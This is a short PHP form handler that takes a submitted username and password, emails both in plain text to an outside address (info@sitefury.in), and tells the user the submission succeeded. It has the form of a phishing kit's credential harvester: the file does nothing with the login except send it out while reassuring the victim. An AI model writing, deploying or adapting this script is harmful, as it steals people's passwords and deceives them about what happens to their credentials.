
<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $to = "info@sitefury.in";
    $subject = "New Form Submission";
    $body = "Username: " . $_POST["username"] . "\nPassword: " . $_POST["password"];
    mail($to, $subject, $body);
    echo "Form submitted successfully.";
} else {
    echo "Invalid request.";
}
?>
